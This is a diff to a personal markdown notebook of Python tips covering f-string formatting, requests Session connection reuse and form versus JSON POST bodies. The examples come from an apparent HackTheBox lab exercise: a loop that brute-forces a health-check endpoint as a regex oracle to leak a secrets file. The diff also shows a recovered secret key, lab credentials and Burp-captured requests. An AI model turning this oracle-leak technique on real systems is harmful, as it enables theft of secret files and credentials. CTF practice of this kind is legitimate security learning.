@@ -96,3 +96,114 @@ h = out[out.index("Hash: ") + 6:].strip()
 print(f"[+] Hash: {h}")
 return h
 ```
+
+---
+## String Format
+```python
+num = 132546
+print(f"Minimum {num=:,d} per round.")
+print(f"Minimum {num=:_.2f} per round.")
+print(f"Minimum {num=:,.2f} per round.")
+print(f"Minimum {num=:<15,.2f} per round.")
+print(f"Minimum {num=:*^15,.2f} per round.")
+print(f"Minimum {num=:>12,d} per round.")
+```
+
+result:
+```text
+>>> num = 132546
+>>> print(f"Minimum {num=:,d} per round.")
+Minimum num=132,546 per round.
+>>> print(f"Minimum {num=:_.2f} per round.")
+Minimum num=132_546.00 per round.
+>>> print(f"Minimum {num=:,.2f} per round.")
+Minimum num=132,546.00 per round.
+>>> print(f"Minimum {num=:<15,.2f} per round.")
+Minimum num=132,546.00      per round.
+>>> print(f"Minimum {num=:*^15,.2f} per round.")
+Minimum num=**132,546.00*** per round.
+>>> print(f"Minimum {num=:>12,d} per round.")
+Minimum num=     132,546 per round.
+```
+
+---
+## re-use http connection
+
+### Session Objects
+The Session object allows you to persist certain parameters across requests. It also persists cookies across all requests made from the Session instance, and will use urllib3’s connection pooling. So if you’re making several requests to the same host, the underlying TCP connection will be reused, which can result in a **significant performance increase**. [read](https://requests.readthedocs.io/en/latest/user/advanced/#session-objects)
+
+#### without re-use connection
+```python
+while not completed:
+    for c in string.printable:
+        try:
+            test = pattern + c
+            json = {"file": "/var/www/rainycloud/secrets.py", "type": "CUSTOM", "pattern": re.escape(test)}
+
+            resp = requests.post(url=url, cookies=cookies, data=json, proxies=proxy)
+
+            print(f"\r{display}{c}", end="")
+            if resp.json().get("result"):
+                pattern += c
+                display = '' if c == "\n" else display + c
+                break
+```
+
+it took 267 secs to complete this sentence `SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'`.
+
+#### re-use connection
+```python
+sess = requests.session()
+sess.proxies.update(proxy)
+sess.post("http://dev.rainycloud.htb/login", data={"username": "gary", "password": "rubberducky"})
+
+while not completed:
+    for c in string.printable:
+        try:
+            test = pattern + c
+            json = {"file": "/var/www/rainycloud/secrets.py", "type": "CUSTOM", "pattern": re.escape(test)}
+
+            resp = sess.post(url=url, data=json)
+
+            print(f"\r{display}{c}", end="")
+            if resp.json().get("result"):
+                pattern += c
+                display = '' if c == "\n" else display + c
+                break
+```
+
+it took 83 secs to complete the same sentence.
+
+---
+## data=payload vs json=payload
+with `resp = sess.post(url=url, json=json)`, the intercepted burp is:
+```text
+POST /api/healthcheck HTTP/1.1
+Host: dev.rainycloud.htb
+User-Agent: python-requests/2.28.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y_tNHQ.yokTJAhLAZa_FwOjud2m8tATqMk
+Content-Length: 76
+Content-Type: application/json
+
+{"file": "/var/www/rainycloud/secrets.py", "type": "CUSTOM", "pattern": "0"}
+```
+
+with `resp = sess.post(url=url, data=json)`, the request is:
+```text
+POST /api/healthcheck HTTP/1.1
+Host: dev.rainycloud.htb
+User-Agent: python-requests/2.28.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y_tM8w.tTpfZy_kMDqjXx-LkoX50kDmp0U
+Content-Length: 65
+Content-Type: application/x-www-form-urlencoded
+
+file=%2Fvar%2Fwww%2Frainycloud%2Fsecrets.py&type=CUSTOM&pattern=l
+```
+
+Particulary in this case, the server won't accept content-type in json. I need to use `Content-Type: application/x-www-form-urlencoded` and proper requests syntax is `data=payload`.
